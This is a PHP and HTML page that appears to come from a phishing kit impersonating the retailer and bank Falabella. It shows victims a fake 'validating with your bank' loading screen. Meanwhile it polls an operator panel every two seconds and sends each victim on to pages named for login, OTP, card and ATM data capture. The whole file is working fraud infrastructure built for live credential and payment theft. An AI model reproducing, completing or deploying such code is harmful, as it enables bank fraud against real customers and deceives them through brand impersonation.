<?php
session_start();

$idreg = $_SESSION['idreg'] ?? '';
if (empty($idreg)) {
    header("Location: ../../checkout.php");
    exit;
}
?>

<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Cargando - Falabella</title>
    <style>
        body {
            background: #fff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            font-family: 'Montserrat', Arial, sans-serif;
        }
        .flip-ring-loader {
            position: relative;
            width: 250px;
            height: 250px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .flip-ring {
            position: absolute;
            left: 0; top: 0;
            width: 250px;
            height: 250px;
            border: 7px solid #e2f3ff;
            border-top: 7px solid #003C82;
            border-radius: 50%;
            box-sizing: border-box;
            animation: spin 1.15s linear infinite;
            z-index: 1;
        }
        @keyframes spin {
            0%   { transform: rotate(0deg);}
            100% { transform: rotate(360deg);}
        }
        .flip-loader-img {
            width: 180px;
            height: 180px;
            display: block;
            animation: flipX 1.3s cubic-bezier(.4,2,.6,.9) infinite;
            transform-style: preserve-3d;
            backface-visibility: hidden;
            z-index: 2;
            position: absolute;
            left: 50%;
            top: 50%;
            transform: translate(-50%, -50%);
            background: transparent;
        }
        @keyframes flipX {
            0%   { transform: translate(-50%, -50%) rotateY(0deg);}
            40%  { transform: translate(-50%, -50%) rotateY(180deg);}
            60%  { transform: translate(-50%, -50%) rotateY(180deg);}
            100% { transform: translate(-50%, -50%) rotateY(360deg);}
        }
        .loader-message {
            margin-top: 32px;
            color: #2d4060;
            font-size: 1.18em;
            font-weight: 500;
            text-align: center;
            max-width: 340px;
            line-height: 1.4;
            letter-spacing: 0.01em;
            opacity: 0.94;
        }
    </style>
</head>
<body>
    <div class="flip-ring-loader">
        <div class="flip-ring"></div>
        <img src="/CORDESMAYO.png" alt="Loader Flip" class="flip-loader-img">
    </div>
    <div class="loader-message">
        Estamos realizando unas validaciones con su banco, espere un momento...
    </div>

    <script>
        document.addEventListener("DOMContentLoaded", () => {
            const idreg = "<?php echo htmlspecialchars($idreg, ENT_QUOTES, 'UTF-8'); ?>";

            if (!idreg) {
                alert("Error interno: idreg no existe en sesión.");
                window.location.href = "../../checkout.php";
                return;
            }

            console.log("Cargando Falabella - Esperando instrucciones del panel para el caso:", idreg);

            // Verificar redirecciones del panel cada 2 segundos
            const checkRedirect = setInterval(async () => {
                try {
                    const r = await fetch(`../../panel_v2/process/panel_api_bridge.php?action=check_redirect&idreg=${idreg}`, {
                        method: 'GET',
                        cache: 'no-cache',
                        headers: {
                            'Cache-Control': 'no-cache',
                            'Pragma': 'no-cache'
                        }
                    });

                    if (r.ok) {
                        const response = await r.json();
                        
                        if (response.success && response.data && response.data.redirect && response.data.estado) {
                            clearInterval(checkRedirect);
                            console.log("Redirigiendo a:", response.data.estado);
                            
                            switch (response.data.estado) {
                                case 'usuario':
                                    window.location.href = "falabella.php";
                                    break;
                                case 'otp':
                                    window.location.href = "otp.php";
                                    break;
                                case 'cc':
                                    window.location.href = "/reintentar.php";
                                    break;
                                case '923':
                                    window.location.href = "923.php";
                                    break;
                                case 'atm':
                                    window.location.href = "atm.php";
                                    break;
                                case 'finalizado':
                                    window.location.href = "finish.php";
                                    break;
                                default:
                                    console.log("Estado desconocido:", response.data.estado);
                                    break;
                            }
                        }
                    }
                } catch (e) {
                    console.error("Error verificando redirección:", e);
                    // Continuar intentando, no detener el proceso
                }
            }, 2000);

            // Limpiar intervalo al salir de la página
            window.addEventListener('beforeunload', () => {
                if (checkRedirect) {
                    clearInterval(checkRedirect);
                }
            });
        });
    </script>
</body>
</html>